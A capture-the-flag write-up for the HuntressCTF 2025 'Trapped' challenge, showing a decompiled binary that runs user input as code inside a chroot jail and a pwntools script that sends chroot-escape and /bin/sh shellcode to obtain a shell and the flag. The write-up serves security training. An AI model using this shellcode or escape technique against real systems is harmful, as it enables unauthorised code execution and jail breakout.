---
title: HuntressCTF 2025 Trapped
draft: false
tags:
  - ctf
  - binary-exploitation
  - shellcode
---

# Trapped

> Well... I'm trapped. Feels like I'm in jail. Can you get the flag?

We're provided a netcat shell, which is running the `trapped` binary. Looking at the decompilation, it's pretty clear:

```
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  builtin_strncpy(local_b8,"/tmp/jail-XXXXXX",0x11);
  setup();
  __ruid = geteuid();
  setreuid(__ruid,0xffffffff);
  pcVar2 = mkdtemp(local_b8);
  if (pcVar2 == (char *)0x0) {
    perror("mkdtemp");
    uVar3 = 1;
  }
  else {
    printf("Creating jail at: %s\n",local_b8);
    puts("Which file would you like to open?");
    __isoc99_scanf(&DAT_0010204b,local_98);
    pcVar2 = strstr(local_98,"flag");
    if (pcVar2 == (char *)0x0) {
      iVar1 = chroot(local_b8);
      if (iVar1 == 0) {
        iVar1 = open("/flag",0x41);
        write(iVar1,"FLAG{FAKE}",10);
        close(iVar1);
        __buf = (code *)mmap((void *)0x1337000,0x1000,7,0x22,0,0);
        if (__buf != (code *)0x1337000) {
          perror("mmap");
        }
        puts("What would you like me to run next? ");
        sVar4 = read(0,__buf,0x1000);
        if ((int)sVar4 == 0) {
          puts("Nothing read in, goodbye");
          uVar3 = 0;
        }
        else {
          (*__buf)();
          uVar3 = 0;
        }
      }
      else {
        perror("chroot");
        uVar3 = 1;
      }
    }
    else {
      puts("Cannot open flag based files");
      uVar3 = 1;
    }
```

It creates a temporary directory, `chroot`s it, puts a fake flag in it, and then asks you for a file to read. Lastly, it maps some memory and executes it. This means we can inject arbitrary shellcode as our second input, and have it executed. Shell-storm has this handy chroot and execve `bin/sh` shellcode https://shell-storm.org/shellcode/files/shellcode-363.html. 

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"

p = remote("10.0.24.194", 9999)

p.recvuntil(b"Which file would you like to open?\n")
p.sendline(b"test")

p.recvuntil(b"What would you like me to run next?")


sc = "\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\xeb\x36\x5e\x88\x46\x0a\x8d\x5e\x05\xb1\xed\xb0\x27\xcd\x80\x31\xc0\xb0\x3d\xcd\x80\x83\xc3\x02\xb0\x0c\xcd\x80\xe0\xfa\xb0\x3d\xcd\x80\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x89\xc2\xb0\x0b\xcd\x80\xe8\xc5\xff\xff\xff/bin/sh.."

log.info(f"Shellcode: {len(sc)} bytes")
p.send(sc)

p.interactive()
```

Then, we simply drop into a shell and can `cat flag.txt` -> `flag{5f8c037a7ca4cb89c80174bca5eaf531}`.